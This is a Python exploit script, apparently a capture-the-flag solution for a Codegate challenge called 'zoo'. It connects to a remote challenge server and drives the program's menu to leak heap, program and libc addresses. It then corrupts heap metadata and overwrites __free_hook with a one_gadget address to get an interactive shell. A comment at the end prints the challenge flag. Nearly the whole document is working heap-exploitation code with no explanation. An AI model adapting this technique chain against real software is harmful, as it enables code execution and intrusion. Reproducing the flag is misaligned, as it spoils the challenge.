import pwnbox, struct
pack = lambda x : struct.pack('<Q',x)
unpack = lambda x : struct.unpack('<Q',x)[0]
p = pwnbox.pipe.SocketPipe('ch41l3ng3s.codegate.kr', 7788)
#p = pwnbox.pipe.ProcessPipe('./zoo')

def init(name):
    for x in [name]:
        p.read_until('>>')
        p.write(x+'\n')
    return p.read_until('-----------* My Own Zoo *-----------')

def adopt(ty, name, flag = False):
    for x in [1, ty, name]:
        p.read_until('>>')
        if flag and x == name:
            p.write(x)
        else:
            p.write(str(x)+'\n')
    return p.read_until('-----------* My Own Zoo *-----------')

def feed(name, mname = None, mdes = None, flag = False):
    for x in [2, name]:
        p.read_until('>>')
        if x == name and flag:
            p.write(str(x))
        else:
            p.write(str(x)+'\n')
    if mname != None:
        for x in [mname, mdes]:
            p.read_until('>>')
            p.write(str(x))
    return p.read_until('-----------* My Own Zoo *-----------')

def clean(name):
    for x in [3, name]:
        p.read_until('>>')
        p.write(str(x)+'\n')
    return p.read_until('-----------* My Own Zoo *-----------')

def walk(name, msg = []):
    for x in [4, name]:
        p.read_until('>>')
        p.write(str(x)+'\n')
    for x in msg:
        p.read_until('>>')
        p.write(str(x))
    return p.read_until('-----------* My Own Zoo *-----------')

def hos(name):
    for x in [5, name]:
        p.read_until('>>')
        p.write(str(x)+'\n')
    return p.read_until('-----------* My Own Zoo *-----------')

def info(name):
    for x in [6, name]:
        p.read_until('>>')
        p.write(str(x)+'\n')
    return p.read_until('-----------* My Own Zoo *-----------')
n0 = 'A'*0x14
n1 = 'daramg1'
n2 = 'daramg2'
n3 = 'daramg3'
n4 = 'daramg4'

init('daramg')
adopt(1, n0)
leak = unpack(feed(n0).split(n0)[1].split(' ate')[0].ljust(8,'\x00'))
heap = leak - 0x8c0
adopt(1, n1)
adopt(1, n2)
adopt(1, n3)

for j in range(2):
    for i in range(20):
        feed(n1)
    for i in range(20):
        walk(n1)

for j in range(2):
    for i in range(16):
        feed(n2)
    for i in range(16):
        walk(n2)
hos(n1)
hos(n2)
for i in range(3):
    clean(n2)
for i in range(2):
    ptr = heap + 0x218+i*8
    pay = pack(ptr-0x10)
    feed(n1,pack(ptr-0x18),pay)
for i in range(20):
    clean(n1)
for i in range(5):
    ptr = heap + 0x228+i*8
    pay = pack(ptr-0x10)
    feed(n1,pack(ptr-0x18),pay)
size = 0x110
feed(n1,'GOGO','\x12'*0x68+pack(size) + pack(0x90))
pay = ''
for i in range(20):
    feed(n3)

walk(n1,[pack(heap+0x230)+'\x00'*0x68+pack(heap+0x618)])
leak1 = unpack(info(n1).split('Species : ')[1].split('\n[-')[0].ljust(8,'\x00'))
pie = leak1-0x02812
read_got = 0x203fa0
walk(n1,[pack(heap+0x230)+'\x00'*0x68+pack(pie+read_got)])
leak2 = unpack(info(n1).split('Species : ')[1].split('\n[-')[0].ljust(8,'\x00'))
libc = leak2 - 0xf7250  # read
one_gadget = libc + 0x4526a
free_hook = libc + 0x3c67a8
walk(n1,[pack(free_hook-0x18)+'\x00'*0x68+pack(pie+read_got)])
walk(n1,[pack(one_gadget)])
#walk
for x in [4,n1]:
    p.read_until('>>')
    p.write(str(x)+'\n')
print hex(pie)
print hex(libc)
p.interact()
# FLAG{When y0u take M3dicine, you $hOuld underst4nd the Function 0f the M3dicine and E4T the right M3dicine}
